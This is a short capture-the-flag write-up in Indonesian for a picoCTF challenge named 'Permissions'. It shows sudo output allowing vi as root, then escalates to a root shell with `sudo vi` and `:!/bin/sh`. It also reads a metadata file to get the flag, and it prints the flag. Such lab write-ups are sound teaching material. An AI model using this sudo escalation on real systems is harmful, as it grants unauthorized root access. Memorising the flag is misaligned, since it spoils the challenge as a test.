# Permissions

## Deskripsi
Can you read files in the root file?

Can you login and read the root file?

## Points 
100

## Hint
What permissions do you have?

## Solusi
Challenge dengan instance yang bisa diakses melalui ssh. Setelah login dicek permission dari sudoer user yang ada dengan perintah
```
$ sudo -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Terlihat dari hasil di atas kita bisa menjalankan vi sebagai root.
Pada link [berikut](https://computersecuritystudent.com/UNIX/SUDO/lesson1/) terdapat cara untuk mengeksploitasi vi untuk bisa login sebagai root.
Pertama buat sebuah file dengan menggunakan perintah sudo vi
```shell
sudo vi test
```
Kemudian ketik `:!/bin/sh` pada vi. Selanjutnya user akan login sebagai root melalui vi.

![Login as root](./id.png)

### Unintended solution
Sama seperti challenge chrono, pada challenge ini juga terdapat unintended solution untuk mendapatkan flag
```shell
$ cat /challenge/metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_f6ad392b}", "username": "REDACTED", "password": "REDACTED"}
```

## Flag
### picoCTF{uS1ng_v1m_3dit0r_f6ad392b}


